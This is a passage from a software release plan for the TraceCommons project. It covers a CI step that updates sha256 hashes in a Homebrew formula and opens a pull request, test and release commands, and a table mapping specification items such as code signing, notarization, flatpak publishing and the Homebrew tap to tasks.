          # Two sha256 lines in one file, so they cannot both be replaced by a
          # blind substitution: the arm64 block comes first, the x86_64 second.
          python3 - "$ARM" "$X86" <<'PY'
          import re, sys
          arm, x86 = sys.argv[1], sys.argv[2]
          path = "Formula/trace-commons-contributor.rb"
          text = open(path).read()
          shas = iter([arm, x86])
          text = re.sub(r'sha256 "[^"]*"',
                        lambda _: f'sha256 "{next(shas)}"', text, count=2)
          open(path, "w").write(text)
          PY
          git config user.name "trace-commons-release"
          git config user.email "ops@tracecommons.ai"
          git commit -am "trace-commons-contributor $V"
          git push -u origin "bump-formula-$V"
          gh pr create --fill --repo TraceCommons/homebrew-tap
```

- [ ] **Step 5: Run the tests and lint**

```bash
cargo test -p trace-commons-contributor --test release_pipeline
actionlint .github/workflows/release-apps.yml .github/workflows/release-contributor.yml
```
Expected: PASS and clean.

- [ ] **Step 6: Cut a real release**

```bash
git tag app-v0.2.0 && git push origin app-v0.2.0
gh run watch --repo TraceCommons/trace-commons-server
```

Expected: a GitHub Release with the DMG and Windows zip, the flatpak repo published to GCS, and an open pull request against the tap. Then run the Task 11 Step 8 install gate against the real published cask, and record every result in `docs/release-runbook.md`.

- [ ] **Step 7: Final commit**

```bash
git add .github/workflows docs/release-runbook.md \
  crates/trace-commons-contributor/tests/release_pipeline.rs
git commit -m "Publish signed releases and bump the Homebrew tap by pull request"
git push
```

---

## Spec Coverage

| Spec section | Task |
| --- | --- |
| Blocker 1: `Package.swift` links `target/debug` | 2 |
| Blocker 2: hardcoded bundle version | 1 |
| Blocker 3: wasted ad-hoc signature | 2 |
| Mint a Developer ID pair we hold; defer revoking `3K939H4WUQ` | 3, and revocation noted in 5 |
| Notarize with the ASC API key | 4 |
| `release-apps.yml`, three independent jobs, dispatch input | 5, 7, 8 |
| macOS sign/notarize/staple/`spctl` | 5 |
| Windows in the matrix, Trusted Signing, mandatory timestamping | 6, 7 |
| Azure OIDC, no key in GitHub | 6 |
| `cargo-sources.json`, flatpak build | 8 |
| GPG-signed OSTree repo, GCS, `.flatpakref` | 9 |
| Key in Secret Manager via workload identity | 9 |
| CLI signing, zip-for-notarization, no staple | 10 |
| Correct the stale unsigned-binary release notes | 10 |
| Homebrew tap, cask, formula | 11 |
| `quit:` stanza and the `zap` exclusion | 11 |
| Bump by pull request, separate tag streams | 12 |
| All four clean-machine verification gates | 5 (macOS), 7 (Windows, incl. post-expiry), 9 (Linux), 11 (Homebrew) |

Out-of-scope items from the spec — a Windows GUI shell, an MSI, upstream cask/Flathub submission, `.deb`/`.rpm`/AppImage — have no tasks, deliberately.
